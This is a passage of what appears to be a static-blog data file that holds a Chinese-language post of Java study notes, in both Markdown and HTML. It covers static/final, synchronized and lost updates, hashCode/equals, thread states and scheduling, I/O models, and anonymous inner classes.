是Object类的方法，在执行两个方法时，要先获得锁。\n- 当线程执行wait()时，会把当前的锁释放，然后让出CPU，进入等待状态。\n- 当执行notify/notifyAll方法时，会唤醒一个处于等待该 对象锁 的线程，然后继续往下执行，直到执行完退出对象锁锁住的区域（synchronized修饰的代码块）后再释放锁。\n\n### `synchronized` 和`lock`\n- `synchronized` : 在资源竞争不是很激烈的情况下，偶尔会有同步的情形下，synchronized是很合适的。原因在于，编译程序通常会尽可能的进行优化synchronize，另外可读性非常好，不管用没用过5.0多线程包的程序员都能理解。\n- `lock(ReentrantLock)` : 提供了多样化的同步，比如有时间限制的同步，可以被Interrupt的同步（synchronized的同步是不能Interrupt的）等。在资源竞争不激烈的情形下，性能稍微比synchronized差点点。但是当同步非常激烈的时候，synchronized的性能一下子能下降好几十倍。而ReentrantLock确还能维持常态。\n\n## Java中的BIO、NIO、AIO\n- `BIO(Blocking I/O)` : 同步阻塞IO，服务器中一个连接一个线程，数据的读取和写入必须阻塞在一个线程内等待其完成。\n- `NIO(New I/O)` : 同步非阻塞IO，服务器中一个请求一个线程，客户端所有连接注册到多路复用器中，多路复用器轮询所有连接，当存在连接有IO请求时才启动一个线程去处理IO。\n- `AIO(Asynchronous I/O)` : 异步非阻塞IO，服务器中一个有效请求一个线程，没有多路复用器轮询，客户端有IO请求给服务器，服务器获得请求后，由OS处理请求，处理完成后，再通知服务器创建一个线程去处理IO结果。\n\n[具体理解请看这](https://juejin.im/entry/598da7d16fb9a03c42431ed3)\n[以及这](http://blog.csdn.net/historyasamirror/article/details/5778378)\n\n### 同步与异步\n同步与异步是针对应用程序与内核的交互而言的。同步过程中进程触发IO操作并等待或者轮询的去查看IO操作是否完成。异步过程中进程触发IO操作以后，直接返回，做自己的事情，IO交给内核来处理，完成后内核通知进程IO完成。\n\n### 阻塞与非阻塞\n简单理解为需要做一件事能不能立即得到返回应答，如果不能立即获得返回，需要等待，那就阻塞了，否则就可以理解为非阻塞\n\n[参考这篇博客的图](http://www.cnblogs.com/Anker/p/3254269.html)\n\n> 未具体理解\n\n## 匿名内部类\n匿名内部类也就是没有名字的内部类\n正因为没有名字，所以匿名内部类只能使用一次，它通常用来简化代码编写\n但使用匿名内部类还有个前提条件：必须继承一个父类或实现一个接口\n``` java\npublic class AnonymousClass {\n\n    public static void main(String[] args) {\n        Runnable x = new Runnable() {\n            @Override\n            public void run() {\n                System.out.println(this.getClass());\n            }\n        };\n        x.run();\n    }\n}\n```\n### 匿名内部类的特征\n- 匿名内部类没有访问修饰符(如`public`、`private`)\n- 当所在方法的形参被匿名内部类使用时，这个行参必须final\n- 匿名内部类没有构造方法，因为它连名字都没有\n\n重点解释第二点:\n首先我们知道在内部类编译成功后，它会产生一个class文件，该class文件与外部类并不是同一class文件，仅仅只保留对外部类的引用。当外部类传入的参数需要被内部类调用时，从java程序的角度来看是直接被调用：\n``` java\npublic class AnonymousClass {\n    public void anonyFinal(String name) {\n        Runnable x = new Runnable() {\n            @Override\n            public void run() {\n                System.out.println(this.getClass() + \" \" + name);\n            }\n        };\n        x.run();\n    }\n}\n```\n从上面代码中看好像name参数应该是被内部类直接调用？其实不然，在java编译之后实际的操作如下：\n``` java\npublic class AnonymousClass$InnerClass {\n    public InnerClass(String name) {\n        this.InnerClass$name = name;\n    }\n    public void run() {\n        System.out.println(this.getClass() + \" \" + this.InnerClass$name);\n    }\n}\n```\n\n从这里可以看出匿名内部类并不是直接调用行参，而是临时产生构造函数，并将行参引用赋给自己的内部变量，并调用内部变量。因此为了让程序员产生这样的直接调用错觉，规定行参必须是final不可更改的。\n\n## 参考资料/相关链接\n- 多线程\n\t- [http://blog.csdn.net/evankaka/article/details/44153709](http://blog.csdn.net/evankaka/article/details/44153709)\n- 匿名内部类\n    - [http://blog.csdn.net/chenssy/article/details/13170015](http://blog.csdn.net/chenssy/article/details/13170015)","source":"_posts/Java小记.md","raw":"---\ntitle: Java 基础小记\ndate: 2018-03-1 15:18:23\ncategories: Java\ntags:\n  - static\n  - final\n  - synchronized\n  - hashCode\n  - equals\n  - Collection\n---\n\n## static和final的区别和用途\n- Static\n\t- 修饰变量:静态变量随着类的加载时完成初始化，内存中只有一个，且JVM也只会为他分配一次内存，所有类共享静态变量，静态变量放在指定的静态共享区，遵循一改全改。\n\t- 修饰方法:静态方法在类加载时就存在与静态区域，不依赖任何实例，Static方法必须实现，不能是抽象类abstract。使用静态方法时可以直接使用`类名.方法名`,不需要实例化一个对象。\n\t- 修饰代码块：类加载完后执行代码块中的内容。\n\n- Final\n\t- 修饰变量：\n\t\t- 编译时常量：类加载的过程完成初始化，编译后带入到任何计算式中，只能是基本类型。\n\t\t- 运行时常量：基本数据类型或引用数据类型，引用不可变，但引用的内容可以变。\n\t- 修饰方法：跟final单词意思相近，最后的方法，表示不能被继承，不能被子类修改重写。\n\t- 修饰类：不能被继承。\n\t- 修饰形参：final形参在方法内不可变。\n\n<!-- more -->\n\n``` java\nclass Value {\n    int i = 1;\n}\n\npublic class FinalDemo {\n\n    static int i = 9;\n    final int i1 = 9;\n    static final int i2 = 29;\n    public static final int i3 = 39;\n    final int i4 = (int)(Math.random()*20);\n    static final int i5 = (int)(Math.random()*20);\n\n    Value v1 = new Value();\n    final Value v2 = new Value();\n    static final Value v3 = new Value();\n\t// final Value v4;\t// Error: var not init in the default constructor\n    final int[] a = {1, 2, 3, 4, 5, 6 };\n\n    public void print(String id) {\n        System.out.println(id + \" : \" + \"i4 = \" + i4 + \", i5 = \" + i5 + \", i = \" + i);\n    }\n\n    public static void main(String[] args) {\n        FinalDemo finalDemo = new FinalDemo();\n        // finalDemo.i1++;  // Error: can't change value\n        finalDemo.v2.i++;\n\t\tFinalDemo.i++;\n\t\tfinalDemo.v1 = new Value();\n\t\tfor (int i = 0; i < finalDemo.a.length; i++) {\n\t\t\tfinalDemo.a[i]++;\n\t\t\t// finalDemo.v2 = new Value();\t// Error: Can't\n\t\t\t// finalDemo.v3 = new Value();\t// change handle\n\t\t\t// finalDemo.a = new int[3];\t// Error: can't assign a value to final var\n\t\t}\n\n\t\tfinalDemo.print(\"fd1\");\n\t\tSystem.out.println(\"Creating new FinalDemo class\");\n\t\tFinalDemo finalDemo2 = new FinalDemo();\n\t\tfinalDemo.print(\"fd1\");\n\t\tfinalDemo2.print(\"fd2\");\n    }\n}\n```\n\n## 同步机制实现原子化 synchronized\n丢失更新(lost update) 有一种特定的过程。\n(1) 取得账户余额。\n`int i = balance;`\n(2) 将账户余额加1。\n`balance = i + 1;`\n这会让计算机以两个步骤来完成账户的变化。通常我们会以单一的命令来做这件事情:\n`balance++;`\n但强行以两个步骤来处理就会浮现出非原子性的问题。下面用两个都想把余额递增的线程来展示丢失更新。\n``` java\nclass TestSync implements Runnable {\n\n    private int balance;\n\n    /** 每个线程都把账户递增50次　**/\n\n    @Override\n    public void run() {\n        for(int i = 0; i < 50; i++) {\n            increament();\n            System.out.println(\"balance is \" + balance);\n        }\n    }\n\n    private void increament() {\n        int i = balance;\n        /** 问题出在我们用的是读取的值而不是目前的值 **/\n        balance = i + 1;\n    }\n}\n\npublic class TestSyncTest {\n\n    public static void main(String[] args) {\n        TestSync job = new TestSync();\n        Thread a = new Thread(job);\n        Thread b = new Thread(job);\n        a.start();\n        b.start();\n    }\n}\n```\n\n用同步机制让`increment()` 方法原子化，将`increment()`方法同步化可以解决丢失更新的问题，因为他会让方法中的两个步骤组成不可分割的单元。\n``` java\nprivate synchronized void increment() {\n    int i = balance;\n    balance = i + 1;\n}\n```\n但同步化是需要付出额外的成本。也就是说进入同步化方法的程序会查询钥匙等性能上的损耗。其次，同步化的方法会让你的程序因为要同步并行的问题而慢下来。同步化会强制线程排队等待执行方法。最后，最可怕的是同步化可能会导致死锁现象。原则上最好制作最少量的同步化。事实上同步化的规模可以小于方法全部，可以用`synchronized`来修饰一行或数行的代码而不必整个方法都同步化。比如:\n``` java\npublic void go() {\n    doStuff();\n\n    synchronized(this) {\n        criticalStuff();\n        moreCriticalStuff();\n    }\n}\n```\n\n并行问题也是线程安全的问题，对于一个类是否线程安全，重要的决定因素便是是否存在上面提及的问题，诸如HashMap和HashTable、StringBuffer和StringBuiler、Vector和ArrayList等的区别，其中HashMap、StringBuiler、ArrayList没有实现同步化，因此是非线程安全的；HashTable、StringBuffer、Vector在原本HashMap、StringBuiler、ArrayList的方法上添加了`synchronized`修饰来保证线程安全。\n\n## hashCode()与equals()的相关规定\nAPI文件有对对象的状态指定出必须遵守的规则：\n1. 如果两个对象相等，则`hashcode`必须也是相等的。\n2. 如果两个对象相等，对其中一个对象调用`equals()`必须返回`true`。也就是说，若`a.equals(b)`则`b.equals(a)`。\n3. 如果两个对象有相同的`hashcode`值，它们也不一定是相等的。但若两个对象相等，则`hashcode`值一定是相等的。\n4. 因此若`equals()`被覆盖过，则`hashCode()`也必须被覆盖。\n5. `hashCode()`的默认行为是对在`heap(堆)`上的对象产生独特的值。如果你没有`override`过`hashCode()`，则该`class`的两个对象怎样都不会被认为是相同的。\n6. `equals()`的默认行为是执行==的比较。也就是说会去测试两个引用是否对上`heap`上同一个对象。如果`equals()`没有被覆盖过，两个对象永远都不会被视为相同的，因为不同的对象有不同的字节组合。\n\n`a.equals(b)`必须与`a.hashCode() == b.hashCode()`等值。但`a.hashCode() == b.hashCode()`不一定要与`a.equals()`等值。\n\n**问：**为什么不同对象会有相同`hashcode`的可能\n**答：**`HashSet`使用`hashcode`来达成存取速度较快的存储方法。如果你尝试用对象来寻找`ArrayList`中相同的对象(也就是不用索引来找)，`ArrayList`会从头开始找起。但是`HashSet`这样找对象的速度就块多了，因为它使用`hashcode`来寻找符合条件的元素。因此当你想要寻找某个对象时，通过`hashcode`就可以很快算出该对象所在的位置，而不用从头一个一个找起。重点在于`hashcode`相同并不一定保证对象是相等的，因为`hashCode()`所使用的杂凑算法也许刚刚好会让多个对象传回相同的杂凑值。越糟糕的杂凑算法越容易碰撞，但这也与数据值域分布的特征有关。如果`HashSet`发现在对比的时候，同样的`hashcode`有多个对象，它会使用`equals()`来判断是否有完全的符合。也就是说，`hashcode`是用来缩小寻找成本，但最后还是要用`equals()`才能认定是否真的找到相同的项目。\n\n> 这与加密中的问题一样，网络中将用户的密码获取后，通过加密算法将密码加密成一个固定长度的无规律字符串保存在数据库中，密码相同，肯定加密的结果是唯一相同的，但是由于加密过后是固定长度，比如32个字节，那么着32个字节就有固定的容量，因此会出现两个不同的密码加密后是一样的字符串。\n\n对于上述第四条和第五条，个人的理解是：`hashCode()`方法原本是根据对象在内存中的位置来计算，因此如果要比较两个对象是否相等，通过原本的`hashCode()`方法计算会得到两个不同的值，因为是两个对象，原本的`hashCode()`是一个对象对应一个唯一的值，这个值与内存位置有关，而两个对象是在不同的内存位置上，如果强行想要表示这两个对象相等，就必须重写原本的`hashCode()`。\n\n同样的，对于`equals()`方法，原本是表示两个引用所指向的对象是否是一个对象，但是我们需要按照自己的意愿去表示两个不同的对象，如果某些特征相同时也表示相等，比如想要表示一个人的信息，在不同时间点记录的信息会不同，但只要身份证号一样，我们就认为这是同一个人。这就需要重写`equals()`方法，让它表示两个不同对象在意义上相同。\n\n综合上述的描述 : `hashCode()`是判断引用相等，`equals()`是判断对象相等。\n\n## Collection API\n![](http://wiki3.cosc.canterbury.ac.nz/images/8/8d/Collections-detail-1.png)\n\n## 多线程\n### [Java实现多线程的方式](http://fenlan.github.io/2016/06/18/java-Thread/)\n- 继承`Thread`类，重写`run`方法\n- 实现`Runable`接口\n- 实现`Callable`接口\n\n> 启动多线程时，`start()`方法的调用后并不是立即执行多线程代码，而是使得该线程变为可运行态（Runnable），什么时候运行是由操作系统决定的。\n> 从程序运行的结果可以发现，多线程程序是乱序执行。因此，只有乱序执行的代码才有必要设计为多线程。\n> Thread.sleep()方法调用目的是不让当前线程独自霸占该进程所获取的CPU资源，以留出一定时间给其他线程执行的机会。\n> 实际上所有的多线程代码执行顺序都是不确定的，每次执行的结果都是随机的。\n\n> 实际上所有的多线程代码都是通过运行Thread的start()方法来运行的。因此，不管是扩展Thread类还是实现Runnable接口来实现多线程，最终还是通过Thread的对象的API来控制线程的。\n\n### 三种方式的区别\n- 实现`Runable`接口能增强程序的健壮性，代码能够被多个线程共享，**代码与数据是独立的**，适合多个相同程序代码的线程区处理同一资源。正如上述同步化所用的程序。\n- 继承`Thread`类不适合资源共享，但继承`Thread`和实现`Runable`都是通过`start()`启动线程，然后JVM将线程放到就绪队列中，如果有处理机可用，则执行`run`方法。\n- 实现`Callable`接口要实现`call`方法，并且线程执行完后是后返回值的，其他两种都没有返回值。\n\n> 在java中，每次程序运行至少启动2个线程。一个是main线程，一个是垃圾收集线程。\n\n### 线程状态\n![](http://img.blog.csdn.net/20150309140927553)\n- 新建状态（New）：新创建了一个线程对象。\n- 就绪状态（Runnable）：线程对象创建后，其他线程调用了该对象的start()方法。该状态的线程位于可运行线程池中，变得可运行，等待获取CPU的使用权。\n- 运行状态（Running）：就绪状态的线程获取了CPU，执行程序代码\n- 阻塞状态（Blocked）：阻塞状态是线程因为某种原因放弃CPU使用权，暂时停止运行。直到线程进入就绪状态，才有机会转到运行状态。阻塞的情况分三种：\n\t- 等待阻塞：运行的线程执行wait()方法，JVM会把该线程放入等待池中。(wait会释放持有的锁)\n\t- 同步阻塞：运行的线程在获取对象的同步锁时，若该同步锁被别的线程占用，则JVM会把该线程放入锁池中。\n\t- 其他阻塞：运行的线程执行sleep()或join()方法，或者发出了I/O请求时，JVM会把该线程置为阻塞状态。当sleep()状态超时、join()等待线程终止或者超时、或者I/O处理完毕时，线程重新转入就绪状态。（注意,sleep是不会释放持有的锁）\n- 死亡状态（Dead）：线程执行完了或者因异常退出了run()方法，该线程结束生命周期。\n\n### 线程调度\n**Java线程有优先级，优先级高的线程会获得较多的运行机会。**\n\nJava线程的优先级用整数表示，取值范围是1~10，Thread类有以下三个静态常量：\n``` java\nstatic int MAX_PRIORITY\n          线程可以具有的最高优先级，取值为10。\nstatic int MIN_PRIORITY\n          线程可以具有的最低优先级，取值为1。\nstatic int NORM_PRIORITY\n          分配给线程的默认优先级，取值为5。\n```\n\n> Thread类的setPriority()和getPriority()方法分别用来设置和获取线程的优先级。\n> 每个线程都有默认的优先级。主线程的默认优先级为Thread.NORM_PRIORITY。\n> 线程的优先级有继承关系，比如A线程中创建了B线程，那么B将和A具有相同的优先级。\n\n### 常用的调度\n- 线程睡眠：Thread.sleep(long millis)方法，使线程转到阻塞状态。millis参数设定睡眠的时间，以毫秒为单位。当睡眠结束后，就转为就绪（Runnable）状态。sleep()平台移植性好。sleep不会释放持有的锁。\n- 线程等待：Object类中的wait()方法，导致当前的线程等待，直到其他线程调用此对象的 notify() 方法或 notifyAll() 唤醒方法。这两个唤醒方法也是Object类中的方法，行为等价于调用 wait(0) 一样。wait会释放持有的锁。\n- 线程让步：Thread.yield() 方法，暂停当前正在执行的线程对象，把执行机会让给相同或者更高优先级的线程。\n- 线程加入：join()方法，等待其他线程终止。在当前线程中调用另一个线程的join()方法，则当前线程转入阻塞状态，直到另一个进程运行结束，当前线程再由阻塞转为就绪状态。\n- 线程唤醒：Object类中的notify()方法，唤醒在此对象监视器上等待的单个线程。如果所有线程都在此对象上等待，则会选择唤醒其中一个线程。选择是任意性的，并在对实现做出决定时发生。线程通过调用其中一个 wait 方法，在对象的监视器上等待。 直到当前的线程放弃此对象上的锁定，才能继续执行被唤醒的线程。被唤醒的线程将以常规方式与在该对象上主动同步的其他所有线程进行竞争；例如，唤醒的线程在作为锁定此对象的下一个线程方面没有可靠的特权或劣势。类似的方法还有一个notifyAll()，唤醒在此对象监视器上等待的所有线程。\n\n### 常用函数说明\n- `sleep(long millis)` : `运行`-->`阻塞` ,在指定的毫秒数内让当前正在执行的线程休眠（暂停执行）\n- `join()` : `运行`-->`阻塞`,在很多情况下，主线程生成并起动了子线程，如果子线程里要进行大量的耗时的运算，主线程往往将于子线程之前结束，但是如果主线程处理完其他的事务后，需要用到子线程的处理结果，也就是主线程需要等待子线程执行完成之后再结束，这个时候就要用到join()方法了。\n- `yield()` : `运行`-->`可运行`,让当前运行线程回到可运行状态，以允许具有相同优先级的其他线程获得运行机会。因此，使用yield()的目的是让相同优先级的线程之间能适当的轮转执行。但是，实际中无法保证yield()达到让步目的，因为让步的线程还有可能被线程调度程序再次选中。\n- `wait()` : `Obj.wait()`，与`Obj.notify()`必须要与`synchronized(Obj)`一起使用，也就是wait,与notify是针对已经获取了Obj锁进行操作，从语法角度来说就是Obj.wait(),Obj.notify必须在synchronized(Obj){...}语句块内。从功能上来说wait就是说线程在获取对象锁后，主动释放对象锁，同时本线程休眠。直到有其它线程调用对象的notify()唤醒该线程，才能继续获取对象锁，并继续执行。相应的notify()就是对对象锁的唤醒操作。但有一点需要注意的是notify()调用后，并不是马上就释放对象锁的，而是在相应的synchronized(){}语句块执行结束，自动释放锁后，JVM会在wait()对象锁的线程中随机选取一线程，赋予其对象锁，唤醒线程，继续执行。这样就提供了在线程间同步、唤醒的操作。Thread.sleep()与Object.wait()二者都可以暂停当前线程，释放CPU控制权，主要的区别在于Object.wait()在释放CPU同时，释放了对象锁的控制\n\n### `wait()`和`notify()`\n- wait() 与 notify/notifyAll() 是Object类的方法，在执行两个方法时，要先获得锁。\n- 当线程执行wait()时，会把当前的锁释放，然后让出CPU，进入等待状态。\n- 当执行notify/notifyAll方法时，会唤醒一个处于等待该 对象锁 的线程，然后继续往下执行，直到执行完退出对象锁锁住的区域（synchronized修饰的代码块）后再释放锁。\n\n### `synchronized` 和`lock`\n- `synchronized` : 在资源竞争不是很激烈的情况下，偶尔会有同步的情形下，synchronized是很合适的。原因在于，编译程序通常会尽可能的进行优化synchronize，另外可读性非常好，不管用没用过5.0多线程包的程序员都能理解。\n- `lock(ReentrantLock)` : 提供了多样化的同步，比如有时间限制的同步，可以被Interrupt的同步（synchronized的同步是不能Interrupt的）等。在资源竞争不激烈的情形下，性能稍微比synchronized差点点。但是当同步非常激烈的时候，synchronized的性能一下子能下降好几十倍。而ReentrantLock确还能维持常态。\n\n## Java中的BIO、NIO、AIO\n- `BIO(Blocking I/O)` : 同步阻塞IO，服务器中一个连接一个线程，数据的读取和写入必须阻塞在一个线程内等待其完成。\n- `NIO(New I/O)` : 同步非阻塞IO，服务器中一个请求一个线程，客户端所有连接注册到多路复用器中，多路复用器轮询所有连接，当存在连接有IO请求时才启动一个线程去处理IO。\n- `AIO(Asynchronous I/O)` : 异步非阻塞IO，服务器中一个有效请求一个线程，没有多路复用器轮询，客户端有IO请求给服务器，服务器获得请求后，由OS处理请求，处理完成后，再通知服务器创建一个线程去处理IO结果。\n\n[具体理解请看这](https://juejin.im/entry/598da7d16fb9a03c42431ed3)\n[以及这](http://blog.csdn.net/historyasamirror/article/details/5778378)\n\n### 同步与异步\n同步与异步是针对应用程序与内核的交互而言的。同步过程中进程触发IO操作并等待或者轮询的去查看IO操作是否完成。异步过程中进程触发IO操作以后，直接返回，做自己的事情，IO交给内核来处理，完成后内核通知进程IO完成。\n\n### 阻塞与非阻塞\n简单理解为需要做一件事能不能立即得到返回应答，如果不能立即获得返回，需要等待，那就阻塞了，否则就可以理解为非阻塞\n\n[参考这篇博客的图](http://www.cnblogs.com/Anker/p/3254269.html)\n\n> 未具体理解\n\n## 匿名内部类\n匿名内部类也就是没有名字的内部类\n正因为没有名字，所以匿名内部类只能使用一次，它通常用来简化代码编写\n但使用匿名内部类还有个前提条件：必须继承一个父类或实现一个接口\n``` java\npublic class AnonymousClass {\n\n    public static void main(String[] args) {\n        Runnable x = new Runnable() {\n            @Override\n            public void run() {\n                System.out.println(this.getClass());\n            }\n        };\n        x.run();\n    }\n}\n```\n### 匿名内部类的特征\n- 匿名内部类没有访问修饰符(如`public`、`private`)\n- 当所在方法的形参被匿名内部类使用时，这个行参必须final\n- 匿名内部类没有构造方法，因为它连名字都没有\n\n重点解释第二点:\n首先我们知道在内部类编译成功后，它会产生一个class文件，该class文件与外部类并不是同一class文件，仅仅只保留对外部类的引用。当外部类传入的参数需要被内部类调用时，从java程序的角度来看是直接被调用：\n``` java\npublic class AnonymousClass {\n    public void anonyFinal(String name) {\n        Runnable x = new Runnable() {\n            @Override\n            public void run() {\n                System.out.println(this.getClass() + \" \" + name);\n            }\n        };\n        x.run();\n    }\n}\n```\n从上面代码中看好像name参数应该是被内部类直接调用？其实不然，在java编译之后实际的操作如下：\n``` java\npublic class AnonymousClass$InnerClass {\n    public InnerClass(String name) {\n        this.InnerClass$name = name;\n    }\n    public void run() {\n        System.out.println(this.getClass() + \" \" + this.InnerClass$name);\n    }\n}\n```\n\n从这里可以看出匿名内部类并不是直接调用行参，而是临时产生构造函数，并将行参引用赋给自己的内部变量，并调用内部变量。因此为了让程序员产生这样的直接调用错觉，规定行参必须是final不可更改的。\n\n## 参考资料/相关链接\n- 多线程\n\t- [http://blog.csdn.net/evankaka/article/details/44153709](http://blog.csdn.net/evankaka/article/details/44153709)\n- 匿名内部类\n    - [http://blog.csdn.net/chenssy/article/details/13170015](http://blog.csdn.net/chenssy/article/details/13170015)","slug":"Java小记","published":1,"updated":"2018-03-09T09:58:25.128Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscxj000myp0loo082h8o","content":"<h2 id=\"static和final的区别和用途\"><a href=\"#static和final的区别和用途\" class=\"headerlink\" title=\"static和final的区别和用途\"></a>static和final的区别和用途</h2><ul>\n<li><p>Static</p>\n<ul>\n<li>修饰变量:静态变量随着类的加载时完成初始化，内存中只有一个，且JVM也只会为他分配一次内存，所有类共享静态变量，静态变量放在指定的静态共享区，遵循一改全改。</li>\n<li>修饰方法:静态方法在类加载时就存在与静态区域，不依赖任何实例，Static方法必须实现，不能是抽象类abstract。使用静态方法时可以直接使用<code>类名.方法名</code>,不需要实例化一个对象。</li>\n<li>修饰代码块：类加载完后执行代码块中的内容。</li>\n</ul>\n</li>\n<li><p>Final</p>\n<ul>\n<li>修饰变量：<ul>\n<li>编译时常量：类加载的过程完成初始化，编译后带入到任何计算式中，只能是基本类型。</li>\n<li>运行时常量：基本数据类型或引用数据类型，引用不可变，但引用的内容可以变。</li>\n</ul>\n</li>\n<li>修饰方法：跟final单词意思相近，最后的方法，表示不能被继承，不能被子类修改重写。</li>\n<li>修饰类：不能被继承。</li>\n<li>修饰形参：final形参在方法内不可变。</li>\n</ul>\n</li>\n</ul>\n<a id=\"more\"></a>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Value</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FinalDemo</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> i = <span class=\"number\">9</span>;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> i1 = <span class=\"number\">9</span>;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> i2 = <span class=\"number\">29</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> i3 = <span class=\"number\">39</span>;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> i4 = (<span class=\"keyword\">int</span>)(Math.random()*<span class=\"number\">20</span>);</span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> i5 = (<span class=\"keyword\">int</span>)(Math.random()*<span class=\"number\">20</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    Value v1 = <span class=\"keyword\">new</span> Value();</span><br><span class=\"line\">    <span class=\"keyword\">final</span> Value v2 = <span class=\"keyword\">new</span> Value();</span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> Value v3 = <span class=\"keyword\">new</span> Value();</span><br><span class=\"line\">\t<span class=\"comment\">// final Value v4;\t// Error: var not init in the default constructor</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"keyword\">int</span>[] a = &#123;<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">print</span><span class=\"params\">(String id)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(id + <span class=\"string\">\" : \"</span> + <span class=\"string\">\"i4 = \"</span> + i4 + <span class=\"string\">\", i5 = \"</span> + i5 + <span class=\"string\">\", i = \"</span> + i);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        FinalDemo finalDemo = <span class=\"keyword\">new</span> FinalDemo();</span><br><span class=\"line\">        <span class=\"comment\">// finalDemo.i1++;  // Error: can't change value</span></span><br><span class=\"line\">        finalDemo.v2.i++;</span><br><span class=\"line\">\t\tFinalDemo.i++;</span><br><span class=\"line\">\t\tfinalDemo.v1 = <span class=\"keyword\">new</span> Value();</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; finalDemo.a.length; i++) &#123;</span><br><span class=\"line\">\t\t\tfinalDemo.a[i]++;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">// finalDemo.v2 = new Value();\t// Error: Can't</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">// finalDemo.v3 = new Value();\t// change handle</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">// finalDemo.a = new int[3];\t// Error: can't assign a value to final var</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tfinalDemo.print(<span class=\"string\">\"fd1\"</span>);</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">\"Creating new FinalDemo class\"</span>);</span><br><span class=\"line\">\t\tFinalDemo finalDemo2 = <span class=\"keyword\">new</span> FinalDemo();</span><br><span class=\"line\">\t\tfinalDemo.print(<span class=\"string\">\"fd1\"</span>);</span><br><span class=\"line\">\t\tfinalDemo2.print(<span class=\"string\">\"fd2\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"同步机制实现原子化-synchronized\"><a href=\"#同步机制实现原子化-synchronized\" class=\"headerlink\" title=\"同步机制实现原子化 synchronized\"></a>同步机制实现原子化 synchronized</h2><p>丢失更新(lost update) 有一种特定的过程。<br>(1) 取得账户余额。<br><code>int i = balance;</code><br>(2) 将账户余额加1。<br><code>balance = i + 1;</code><br>这会让计算机以两个步骤来完成账户的变化。通常我们会以单一的命令来做这件事情:<br><code>balance++;</code><br>但强行以两个步骤来处理就会浮现出非原子性的问题。下面用两个都想把余额递增的线程来展示丢失更新。<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestSync</span> <span 